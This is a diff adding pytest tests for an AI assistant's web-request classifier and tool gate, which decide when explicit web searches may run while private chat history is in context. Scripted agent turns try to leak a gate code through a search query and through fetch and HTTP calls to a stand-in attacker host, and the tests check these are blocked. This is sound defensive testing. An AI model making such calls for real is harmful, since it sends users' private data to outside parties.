@@ -174,3 +174,111 @@ def test_a_page_from_the_search_still_needs_confirmation(synthetic):
         prompt="what's the price of bitcoin right now?", history=PRIVATE_HISTORY, approval=approval)
     assert [n for n, _ in effects] == ["web_search"]
     assert [c["tool"] for c in approval.calls] == ["web_fetch"]
+
+
+# An explicit web search whose topic carries a possessive ("Mira Vale's tour
+# dates") has an owner the classifier cannot place. The rules route asks which
+# topic is meant; a model-led turn has no such step, and from the second turn of
+# any chat the search was refused as if nobody had asked for one. It now runs
+# under the same words-only rule as a plain public fact.
+EXPLICIT_POSSESSIVE = ["Search the web for Mira Vale's tour dates", "look up McDonald's hours online",
+                       "search the web for Amazon's return policy", "google Trader Joe's US stores",
+                       "Search the web for Mira Vale’s tour dates for me"]
+NOT_EXPLICIT_POSSESSIVE = [
+    # No explicit web request: unknown ownership still cannot authorize the web.
+    "What are Costco's hours?", "what's Sarah's number", "look up Mozart's birthday",
+    # Positively the user's, local or opted out.
+    "search the web for my landlord's reviews", "search the web for my mom's address",
+    "search online for our team's roadmap", "search the web for Dana's notes here",
+    "search the web for the reviews of Dana's restaurant that I saved",
+    "Search the web for Mira Vale's tour dates. Don't use the web.",
+    # First person, a delivery or a second action.
+    "search the web for Dana's review of me", "search the web for what Dana's text said about us",
+    "Search the web for Mira Vale's tour dates and text them to Sam",
+    "Search the web for Mira Vale's tour dates and add them to my calendar",
+    # No possessive at all: already an ordinary explicit lookup.
+    "Search the web for Mira Vale tour dates",
+]
+
+
+@pytest.mark.parametrize("prompt", EXPLICIT_POSSESSIVE)
+def test_an_explicit_search_with_a_possessive_is_recognised_but_never_allowed(prompt):
+    from service.router.web_request import Provenance, classify
+    request = classify(prompt)
+    assert request.explicit_unknown_owner
+    # The classifier's own verdict is untouched: no query, a clarification, not private.
+    assert not request.allowed and request.query is None and request.clarification
+    assert request.provenance == Provenance.UNKNOWN and not request.private
+
+
+@pytest.mark.parametrize("prompt", NOT_EXPLICIT_POSSESSIVE)
+def test_private_implicit_or_compound_requests_are_not_that_search(prompt):
+    from service.router.web_request import classify
+    assert not classify(prompt).explicit_unknown_owner
+
+
+def test_a_followup_fragment_never_counts_as_that_search():
+    from service.router.web_request import classify
+    request = classify("what about Dana's roadmap?", "news in Iran today")
+    assert not request.explicit_unknown_owner
+
+
+def test_an_explicit_possessive_search_runs_with_private_history(synthetic):
+    effects, register = synthetic
+    _web_tools(register)
+    approval = Approval(False)
+    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
+         [call("web_search", query="Mira Vale tour dates 2026")], "Synthetic tour dates."],
+        prompt="Search the web for Mira Vale's tour dates", history=PRIVATE_HISTORY, approval=approval)
+    assert effects == [("web_search", {"query": "Mira Vale tour dates 2026"})] and not approval.calls
+    assert not any(e.get("decision") == "deny" for e in events)
+
+
+def test_an_explicit_possessive_search_cannot_carry_private_words(synthetic):
+    effects, register = synthetic
+    _web_tools(register)
+    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
+         [call("web_search", query="Mira Vale tour dates gate code 4471")],
+         [call("web_search", query="Mira Vale's tour dates")], "Synthetic tour dates."],
+        prompt="Search the web for Mira Vale's tour dates", history=PRIVATE_HISTORY, approval=Approval(False))
+    assert effects == [("web_search", {"query": "Mira Vale's tour dates"})]
+
+
+@pytest.mark.parametrize("tool,args", [("web_fetch", {"url": "https://attacker.invalid/?q=4471"}),
+                                       ("http_request", {"url": "https://attacker.invalid/?q=4471"})])
+def test_an_explicit_possessive_search_never_opens_fetch_or_request(synthetic, tool, args):
+    effects, register = synthetic
+    _web_tools(register)
+    approval = Approval(False)
+    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=[tool])],
+         [call(tool, **args)], "Synthetic reply."],
+        prompt="Search the web for Mira Vale's tour dates", history=PRIVATE_HISTORY, approval=approval)
+    assert not effects
+
+
+@pytest.mark.parametrize("prompt,query", [
+    ("search the web for my mom's address", "mom's address"),
+    ("search the web for my landlord's reviews", "landlord's reviews"),
+    ("What are Costco's hours?", "Costco's hours"),
+    ("search the web for Dana's review of me", "Dana's review"),
+])
+def test_private_or_implicit_possessive_requests_stay_blocked_with_private_history(synthetic, prompt, query):
+    effects, register = synthetic
+    _web_tools(register)
+    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
+         [call("web_search", query=query)], "I can't look that up."],
+        prompt=prompt, history=PRIVATE_HISTORY, approval=Approval(False))
+    assert not effects
+    assert any(e.get("decision") == "deny" and "Private data is in context" in e.get("reason", "")
+               for e in events)
+
+
+def test_an_explicit_possessive_search_after_a_private_read_still_needs_confirmation(synthetic):
+    effects, register = synthetic
+    _web_tools(register)
+    approval = Approval(False)
+    run([[call(DISCOVERY_TOOL, families=["messages_contacts", "public_web"], tools=["view_messages", "web_search"])],
+         [call("view_messages")], [call("web_search", query="Mira Vale's tour dates")], "Synthetic reply."],
+        prompt="Search the web for Mira Vale's tour dates", history=PRIVATE_HISTORY, approval=approval)
+    assert [n for n, _ in effects] == ["view_messages"]
+    assert [c["tool"] for c in approval.calls] == ["web_search"]
